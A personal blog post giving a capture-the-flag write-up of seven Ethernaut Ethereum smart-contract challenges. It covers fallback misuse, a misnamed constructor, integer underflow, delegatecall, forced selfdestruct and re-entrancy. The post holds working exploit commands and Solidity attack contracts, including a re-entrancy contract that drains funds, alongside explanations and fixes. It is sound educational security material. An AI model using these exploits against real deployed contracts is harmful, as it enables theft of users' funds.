---
layout: post
published: true
title: "Ethernaut: Ethereum Smart Contract CTF Writeup"
subtitle:  "After a final exam, it's time to have some kind of relax and prepare for senior project in next semester. Since my senior project topic is about Ethereum blockchain, apart from under stand its architecture, I have to hands on an experience for writing smart contract."
date: 2017-12-22 7:00:00 +0700
header-img: "/assets/img/posts/ethernautctf/intro.PNG"
categories: story
tags: [writeup, blockchain, ethereum]
---

[![][img-intro]][img-intro]

After a final exam, it's time to have some kind of relax 
and prepare for senior project in next semester.
Since my senior project topic is about Ethereum blockchain
, apart from under stand its architecture, I have to hands on an experience for writing smart contract.
I think "break it to learn it" is one of a good way to learn anything, 
so I search for Ethereum smart contract CTF and found this one, [https://ethernaut.zeppelin.solutions][ethernaut-ctf].
Its pronunciation is synonym with [eternaut][eternaut], I think it was a popular comic at the period of time.
In this CTF, there is a set of vulnerabilities smart contracts, to archive the goal of each challenge requires you to find a flaw in a given source code, then, beat it. 
I encourage you to do it yourself first before reading this writeup.
<br>
<br>
Tools that make will make your life easier
<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [Metamask][metamask]: Chrome extension that will brings Ethereum to our browser.
<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [Remix Solidity IDE][remix]: some challenge requires you to write a smart contract, this one is a great IDE.
<br>

<h3>1. Fallback</h3>
To win this challenge
1. owns the target contract.
2. reduce its balance to 0.

An introduction to `fallback` function. Let's read the [doc][doc].

{% highlight code%}
Fallback Function
A contract can have exactly one unnamed function. This function cannot have arguments and cannot return anything. It is **executed on a call to the contract if none of the other functions match the given function identifier (or if no data was supplied at all).**

Furthermore, this function is **executed whenever the contract receives plain Ether (without data).** 
{% endhighlight %}

From the doc, we see that the fallback function is executed when
1. you call a function that don't matches any function name on the contract.
2. you don't assign any data to the trasaction (e.g. send pure transaction).

So This is how we do to win the challenge.
```javascript
> await contract.contribute({value:555}) //for become a contributor
> await contract.sendTransaction({value:555}) //for invoke fallback function, become an owner
> await contract.withdraw() //get all the money
```

<h3>2. Fallout</h3>
We have to claim ownership of the target contract. While take a look at a given source code I
found something interesting.
{% highlight code%}
/* constructor */
function Fal1out() payable {
  owner = msg.sender;
  allocations[owner] = msg.value;
}
{% endhighlight %}

Wait, a comment on `Fal1back` aims it to be a constructor but it is not the same name 
with the contract name (`Fallback`). So it is not constrcutor, it is a `function`.
And when we call this function it will assign the sender to become an owner.
```javascript
await contract.Fal1out()
```

This is all we have to do. We will become the owner and the winner at the same time.

<h3>3. Token</h3>
The goal here is to find the way to get more token.

There is only one function that could be an attack vector.
{% highlight code%}
function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
}
{% endhighlight %}

In this function do you see something wrong?. The only one condition to transfer is the balance of our token must more than the amount of value we want to transfer. The condition is not coverage enough. What if we send **negative** value. At the beginning we have 20 tokens. When we call transfer with address parameter as the target contract and the negative value to trick an intergered overflow.

```javascript
await contract.transfer(instance, -55555)
```

So we have to check the amout of value that it is greater that zero or not.
{% highlight code%}
_value > 0
{% endhighlight %}

<h3>4. Delegation</h3>
Claims ownership and win this challenge.

The current level contract owns this contract now.
```javascript
> level
"0x68....."
> await contract.owner()
"0x68....."
```

There are two smart contract, `Delegate` and `Delegation`. 
In a fallback function of the `Delegation` there is a `delegatecall` to <u>any</u> function in 
`Delegate` according to the data in a transaction. Thanks a `pwn()` function, when we call it we will become an owner. Let's find the way to call this one.
(`delegatecall` is a method for call function on the other contract while refering the caller's storage
, address and balance.)

When you call any function in Ethereum smart contract.
For example, you call `withdraw(55555)`.
Here is the data sent in the transaction.

{% highlight code%}
0x2e1a7d4d000000000000000000000000000000000000000000000000000000000000d903
{% endhighlight %}

We can check this in [etherscan.][etherscan]

[![][img-data-sent]][img-data-sent]

How this data come from?.

First of all, we divide a function name and the argument(`withdraw` , `55555`). We will look at the argument `data type`. Since `55555` is `uint256` We will structs the term with the function name and its data type of each argument.
{% highlight code%}
withdraw(uint256)
{% endhighlight %}

We will compute `Keccak-256 SHA3` on it and get only the `first 4 bytes`.

{% highlight code%}
keccak256("withdraw(uint256)") = "0x2e1a7d4d13322e7b96f9a57413e1525c250fb7a9021cf91d1540d5b69f16a49f"
and we get only "0x2e1a7d4d" or "2e1a7d4d" // first 4 bytes
{% endhighlight %}

This is what we call `MethodID` in Ethereum smart contract.

After that, we will put each argument in `hex` format, so if your balance is `55555`, the argument in the data will be `d903`. We have to add a zero padding, since `unit256` has 32 bytes. Our argument will becomes 

{% highlight code%}
000000000000000000000000000000000000000000000000000000000000d903
{% endhighlight %}

Putting it altogether, we have our data.
{% highlight code%}
0x2e1a7d4d000000000000000000000000000000000000000000000000000000000000d903
{% endhighlight %}

Of course some function has more than one argument, just put the next argument with zero padding after the previous argument and don't forget to put its data type to compute Keccak-256 SHA3 (e.g. `transfer(address,uint256)`)

This is the data we have to send to call `pwn()`.
{% highlight code%}
bytes4(keccak256("pwn()")) => dd365b8b //first 4 bytes, since there is no argument
{% endhighlight %}

We can use `Keccak-256 SHA3` in web3 with `web3.sha3(...)`.
```javascript
> let mydata = web3.sha3("pwn()").substring(2,10)
> await contract.sendTransaction({data:mydata})
```

And you will be the owner now.
```javascript
> await contract.owner()
"0x07....."
```
(or you can use Remix and just click on the pwn() function button)

Remember that this is not a vulnerability in Ethereum, it is a developer error.
If you can remember, [Parity Multisig was hacked][delegation-parity] with 31 Millions Ether stolen with this kind of error a few months ago.

<h3>5. Force</h3>
Make the balanece of the contract greater than zero and win this challenge, hmm, how easy it is.
But wait, when we look at a given source code. It is an empty contract.
<br>
If we try to send transaction directly to the target contract, it will show `falied` status.
Because there is no `payable` function since it is an empty contract. How to `force` this contract to 
recieve our ether?. Let's deep dive into the [doc.][doc]
{% highlight code%}
A contract without a payable fallback function can receive Ether as a recipient of a coinbase transaction (aka miner block reward) or as a destination of a `selfdestruct`.

A contract cannot react to such Ether transfers and thus also `cannot reject them`. This is a design choice of the EVM and Solidity cannot work around it.
{% endhighlight %}

You see that we can 
1. set to recipient of a coinbase transaction
2. use `selfdestruct` 

Let's use `selfdestruct`. Whenever it is called, that contract will be changed to `suicide` state
and send all money to the the address in a given parameter.

{% highlight code%}
pragma solidity ^0.4.18;

contract ForcePwn{
    address public victim_address;

    function ForcePwn(address _address){
        victim_address = _address;
    }
    function pwn() payable{
        selfdestruct(victim_address);
    }
}
{% endhighlight %}

Create this contract with the target contract address as a parameter, then, call `pwn()` with some ether. Our contract will has `suicide` state and send all ether to the target contract.

<h3>6. King</h3>
To win this challenge, you are required to be the king. 

```javascript
> level
"0x32....."
> await contract.king()
"0x32....."
> let prize = await contract.prize()
> fromWei(prize.toNumber())
"1"
```
From the information above, the king is the current level contract with the prize of 1 ether.
Considering a condition in the fallback function.
{% highlight code%}
require(msg.value >= prize || msg.sender == owner);
{% endhighlight %}

Because we are not the owner, so the second solution will be `false`.
Nevermind, there is the first condition for us since it is an OR operation.
The solution is to send ether more than the prize to become the king. In this case, sending 
more than 1 ether.

```javascript
await contract.sendTransaction({value:toWei(1.01)})
```

And now you are the king.

(According to the challenge description, after we submit the instance, the current level contract
shoud reclaims my throne, but nothing else happens)

<h3>7. Re-entrancy</h3>
Only one goal here, steals all funds of the target contract. 

Thanks to the challenge name, I search for what `Re-entrancy` means.
I found this [blog][reentrancy-blog] which has a well explaination on what it is and how the attack works. [The Dao got hacked][reentrancy-thedao] with this vulnerability last year.
The vulnerable part is that the contract send ether to sender before 
reducing the sender balance in the system. 

We will use the fallback function to complete our attack.
Here is my smart contract to attack the target smart contract.
{% highlight code%}
pragma solidity ^0.4.18;

import './Reentrance.sol';

contract ReentrancyPwn{
    Reentrance public reentrance;
        
    // Constructor
    function ReentrancyPwn(address victim_address){
        reentrance = Reentrance(victim_address);
    }
    
    // For sending the stolen money to my self :)
    function kill(){
        selfdestruct(msg.sender);
    }
    
    function() payable {
        reentrance.withdraw(0.5 ether);  
    }
}
{% endhighlight %}

Let's have a simple debugging to understand how the attack work.
[![][img-how-reentrnacy-work]][img-how-reentrnacy-work]

When we send transaction without any data to our smart contract. 
The fallback function will be triggered(`5`)
, it will calls the withdraw function on the target smart contract(`1`).
Before sending any ether, the target smart contract will validates the amount of withdrawal(`2`),
then will transfer ether to the withdrawer (our smart contract)(`3`). 

Here is where the attack happens. It should reduce the balance in the system at `4`. Unfortunately, it is not.
When the target contract transfer money to our contract it will calls the fallback function
of our contract (`5`) (since there is no any data transfer, just pure transaction).
Do you feel that we have reached this point before?, you are right we are in the loop. 
{% highlight code%}
5 > 6 > 1 > 2 > 3 > 5 > 6 > 1 > 2 > 3 > 5 ...
{% endhighlight %}

We will recieve ether from the target for each loop because the balance of the withdrawer 
don't being reduced (don't reachs `4`) 
and the loop will end when running out of gas or the target contract has no enough ether to send.

And again, this is a human error, not a flaw in Ethereum.
You will see that we can prevent this kind of attack by reducing the sender balance
before transfer any ether, or speaking in the code language, puts `4` before `3`.

<br>
It is an awesome CTF, many thanks to Zeppelin team. I learn a lot about Ethereum smart contract like how the magic of smart contract works just only sending a transaction
, structure and data types of solidity language
, things to mention on security flaw when we write smart contract
, understand that writing secure smart contract is a tricky challenge and not an easy task to complete. 
It will be my pleasure if you have any suggestion or alternative solution to share to the other here.
<!-- FB Comment -->
<div class="fb-comments" data-href="https://chrsow.github.io{{ page.url }}" data-colorscheme="dark" data-num-posts="4" data-width="100%"></div>

[ethernaut-ctf]: https://ethernaut.zeppelin.solutions
[eternaut]: https://en.wikipedia.org/wiki/The_Eternaut
[metamask]: https://metamask.io
[remix]: https://remix.ethereum.org
[doc]: http://solidity.readthedocs.io/en/develop/contracts.html
[etherscan]: https://ropsten.etherscan.io
[delegation-parity]: https://blog.zeppelin.solutions/on-the-parity-wallet-multisig-hack-405a8c12e8f7
[reentrancy-blog]: https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4
[reentrancy-thedao]: http://hackingdistributed.com/2016/07/13/reentrancy-woes/
[img-intro]: {{ site.baseurl }}/assets/img/posts/ethernautctf/intro.PNG 
[img-data-sent]: {{ site.baseurl }}/assets/img/posts/ethernautctf/data-sent.PNG 
[img-how-reentrnacy-work]: {{ site.baseurl }}/assets/img/posts/ethernautctf/how-reentrancy-work.PNG 